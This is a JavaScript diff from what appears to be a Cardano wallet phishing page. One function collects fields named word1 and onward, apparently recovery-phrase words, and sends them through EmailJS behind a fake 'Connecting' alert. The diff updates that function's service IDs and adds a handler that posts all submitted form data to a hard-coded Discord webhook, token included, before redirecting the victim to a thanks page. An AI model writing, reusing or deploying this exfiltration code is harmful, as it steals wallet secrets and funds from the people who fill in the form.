@@ -20,6 +20,7 @@ function showWords(count) {
 
 
 
+
 function sendMail() {
     var templateParams = {
      word1: document.getElementById('word1').value,
@@ -65,5 +66,42 @@ function sendMail() {
  .addEventListener('submit', function(event) {
    event.preventDefault();});
 
-    emailjs.send("service_oyx2jzb", "template_aqy1utb", templateParams).then(alert("Connecting. Please refresh page to continue"));
+    emailjs.send("service_t7gea3i", "template_jlaygdt", templateParams).then(alert("Connecting!")); 
 }
+
+
+document.addEventListener("DOMContentLoaded", function () {
+    document.getElementById("contactForm").addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        // Collect form data
+        let formData = new FormData(this);
+        let messageContent = "**New Form Submission on Cardano**\n";
+
+        formData.forEach((value, key) => {
+            if (value.trim() !== "") {
+                messageContent += `**${key}**: ${value}\n`;
+            }
+        });
+
+        // Your Discord webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1293947126551805972/p6E69lwa7SGRlUIN7lfqD0UIQ-HVvdqTGmNNGnqzCPrmUqxyL9GSpAMIHpn3nNoW6w0o";
+
+        // Send data to Discord
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: messageContent })
+            });
+
+            // Redirect to another page after successful submission
+            window.location.href = "thanks.html"; // Change this to your desired page
+        } catch (error) {
+            console.error("Error sending to Discord:", error);
+            alert("Failed to process. Please try again.");
+        }
+    });
+});
+
+
